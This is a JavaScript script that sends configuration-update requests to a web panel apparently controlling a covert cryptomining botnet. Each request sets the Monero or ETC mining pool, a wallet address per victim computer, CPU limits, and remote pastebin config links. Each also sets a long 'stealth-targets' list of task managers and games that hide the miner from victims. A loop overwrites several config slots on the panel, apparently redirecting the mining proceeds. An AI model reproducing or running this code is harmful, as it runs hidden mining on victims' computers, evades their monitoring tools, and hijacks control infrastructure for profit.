function fetchData(url) {
    let _type = "POST";
    let _url = url + "/api/ajax-actions.php";
    let _data = {
        "method": "config-update",
        "index": 1,
        "data": JSON.stringify({
            "algo": "rx/0",
            "pool": "randomxmonero.auto.nicehash.com",
            "port": 9200,
            "wallet": "3Mj3isU7efFTY3hwzMhneurp7bRYw5A23B.{COMPUTERNAME}",
            "password": "",
            "nicehash": false,
            "ssltls": false,
            "max-cpu": 80,
            "idle-wait": 7,
            "idle-cpu": 90,
            "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,ModernWarfare.exe,ShooterGame.exe,ShooterGameServer.exe,ShooterGame_BE.exe,GenshinImpact.exe,FactoryGame.exe,Borderlands2.exe,EliteDangerous64.exe,PlanetCoaster.exe,Warframe.x64.exe,NMS.exe,RainbowSix.exe,RainbowSix_BE.exe,CK2game.exe,ck3.exe,stellaris.exe,arma3.exe,arma3_x64.exe,TslGame.exe,ffxiv.exe,ffxiv_dx11.exe,GTA5.exe,FortniteClient-Win64-Shipping.exe,r5apex.exe,VALORANT.exe,csgo.exe,PortalWars-Win64-Shipping.exe,FiveM.exe,left4dead2.exe,FIFA21.exe,BlackOpsColdWar.exe,EscapeFromTarkov.exe,TEKKEN 7.exe,SRTTR.exe,DeadByDaylight-Win64-Shipping.exe,PointBlank.exe,enlisted.exe,WorldOfTanks.exe,SoTGame.exe,FiveM_b2189_GTAProcess.exe,NarakaBladepoint.exe,re8.exe,Sonic Colors - Ultimate.exe,iw6sp64_ship.exe,RocketLeague.exe,Cyberpunk2077.exe,FiveM_GTAProcess.exe,RustClient.exe,Photoshop.exe,VideoEditorPlus.exe,AfterFX.exe,League of Legends.exe,Fallout4.exe,FarCry5.exe,RDR2.exe,Little_Nightmares_II_Enhanced-Win64-Shipping.exe,NBA2K22.exe,Borderlands3.exe,LeagueClientUx.exe,RogueCompany.exe,Tiger-Win64-Shipping.exe,WatchDogsLegion.exe,Phasmophobia.exe,VRChat.exe,NBA2K21.exe,NarakaBladepoint.exe,ForzaHorizon4.exe,acad.exe,AndroidEmulatorEn.exe,bf4.exe,zula.exe,Adobe Premiere Pro.exe,GenshinImpact.exe",
            "kill-targets": "",
            "stealth-fullscreen": true,
            "remote-config": "https://pastebin.com/raw/7dCgdHCt",
            "api-endpoint": "http://web-panel.online/api/endpoint.php"
        })
    };

    unam_jsonAjax(_type, _url, _data,
        function(response) {
            console.log("Success:", response);
        },
        function(error) {
            console.error("Error:", error);
        }
    );
}
function fetchData2(url) {
    let _type = "POST";
    let _url = url + "/api/ajax-actions.php";
    let _data = {
        "method": "config-update",
        "index": 2,
        "data": JSON.stringify({
            "algo": "etchash",
            "pool": "etchash.auto.nicehash.com",
            "port": 9200,
            "password": "x",
            "nicehash": true,
            "ssltls": false,
            "wallet": "3Mj3isU7efFTY3hwzMhneurp7bRYw5A23B.new_etc",
            "max-cpu": 80,
            "idle-wait": 7,
            "idle-cpu": 90,
            "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,ModernWarfare.exe,ShooterGame.exe,ShooterGameServer.exe,ShooterGame_BE.exe,GenshinImpact.exe,FactoryGame.exe,Borderlands2.exe,EliteDangerous64.exe,PlanetCoaster.exe,Warframe.x64.exe,NMS.exe,RainbowSix.exe,RainbowSix_BE.exe,CK2game.exe,ck3.exe,stellaris.exe,arma3.exe,arma3_x64.exe,TslGame.exe,ffxiv.exe,ffxiv_dx11.exe,GTA5.exe,FortniteClient-Win64-Shipping.exe,r5apex.exe,VALORANT.exe,csgo.exe,PortalWars-Win64-Shipping.exe,FiveM.exe,left4dead2.exe,FIFA21.exe,BlackOpsColdWar.exe,EscapeFromTarkov.exe,TEKKEN 7.exe,SRTTR.exe,DeadByDaylight-Win64-Shipping.exe,PointBlank.exe,enlisted.exe,WorldOfTanks.exe,SoTGame.exe,FiveM_b2189_GTAProcess.exe,NarakaBladepoint.exe,re8.exe,Sonic Colors - Ultimate.exe,iw6sp64_ship.exe,RocketLeague.exe,Cyberpunk2077.exe,FiveM_GTAProcess.exe,RustClient.exe,Photoshop.exe,VideoEditorPlus.exe,AfterFX.exe,League of Legends.exe,Fallout4.exe,FarCry5.exe,RDR2.exe,Little_Nightmares_II_Enhanced-Win64-Shipping.exe,NBA2K22.exe,Borderlands3.exe,LeagueClientUx.exe,RogueCompany.exe,Tiger-Win64-Shipping.exe,WatchDogsLegion.exe,Phasmophobia.exe,VRChat.exe,NBA2K21.exe,NarakaBladepoint.exe,ForzaHorizon4.exe,acad.exe,AndroidEmulatorEn.exe,bf4.exe,zula.exe,Adobe Premiere Pro.exe,GenshinImpact.exe",
            "kill-targets": "",
            "stealth-fullscreen": true,
            "remote-config": "https://pastebin.com/raw/M56T7Yya",
            "api-endpoint": "http://web-panel.online/api/endpoint.php"
        })
    };

    unam_jsonAjax(_type, _url, _data,
        function(response) {
            console.log("Success:", response);
            logout();
        },
        function(error) {
            console.error("Error:", error);
        }
    );
}

async function logout() {
    await fetch("/logout.php", {
        "credentials": "include",
        "headers": {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"
        },
        "method": "GET",
        "mode": "cors"
    })

}

function fetchDataN(N) {
    let _type = "POST";
    let _url = url + "/api/ajax-actions.php";
    let _data = {
        "method": "config-update",
        "index": N,
        "data": JSON.stringify({
            "algo": "rx/0",
            "pool": "randomxmonero.auto.nicehash.com",
            "port": 9200,
            "wallet": "3Mj3isU7efFTY3hwzMhneurp7bRYw5A23B.{COMPUTERNAME}",
            "password": "",
            "nicehash": false,
            "ssltls": false,
            "max-cpu": 80,
            "idle-wait": 7,
            "idle-cpu": 90,
            "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,ModernWarfare.exe,ShooterGame.exe,ShooterGameServer.exe,ShooterGame_BE.exe,GenshinImpact.exe,FactoryGame.exe,Borderlands2.exe,EliteDangerous64.exe,PlanetCoaster.exe,Warframe.x64.exe,NMS.exe,RainbowSix.exe,RainbowSix_BE.exe,CK2game.exe,ck3.exe,stellaris.exe,arma3.exe,arma3_x64.exe,TslGame.exe,ffxiv.exe,ffxiv_dx11.exe,GTA5.exe,FortniteClient-Win64-Shipping.exe,r5apex.exe,VALORANT.exe,csgo.exe,PortalWars-Win64-Shipping.exe,FiveM.exe,left4dead2.exe,FIFA21.exe,BlackOpsColdWar.exe,EscapeFromTarkov.exe,TEKKEN 7.exe,SRTTR.exe,DeadByDaylight-Win64-Shipping.exe,PointBlank.exe,enlisted.exe,WorldOfTanks.exe,SoTGame.exe,FiveM_b2189_GTAProcess.exe,NarakaBladepoint.exe,re8.exe,Sonic Colors - Ultimate.exe,iw6sp64_ship.exe,RocketLeague.exe,Cyberpunk2077.exe,FiveM_GTAProcess.exe,RustClient.exe,Photoshop.exe,VideoEditorPlus.exe,AfterFX.exe,League of Legends.exe,Fallout4.exe,FarCry5.exe,RDR2.exe,Little_Nightmares_II_Enhanced-Win64-Shipping.exe,NBA2K22.exe,Borderlands3.exe,LeagueClientUx.exe,RogueCompany.exe,Tiger-Win64-Shipping.exe,WatchDogsLegion.exe,Phasmophobia.exe,VRChat.exe,NBA2K21.exe,NarakaBladepoint.exe,ForzaHorizon4.exe,acad.exe,AndroidEmulatorEn.exe,bf4.exe,zula.exe,Adobe Premiere Pro.exe,GenshinImpact.exe",
            "kill-targets": "",
            "stealth-fullscreen": true,
            "remote-config": "https://pastebin.com/raw/7dCgdHCt",
            "api-endpoint": "http://web-panel.online/api/endpoint.php"
        })
    };

    unam_jsonAjax(_type, _url, _data,
        function(response) {
            console.log("Success:", response);
        },
        function(error) {
            console.error("Error:", error);
        }
    );
}


for (let i = 3; i <= 10; i++) {
    fetchDataN(i);
}
fetchData("http://web-panel.online");
fetchData2("http://web-panel.online")
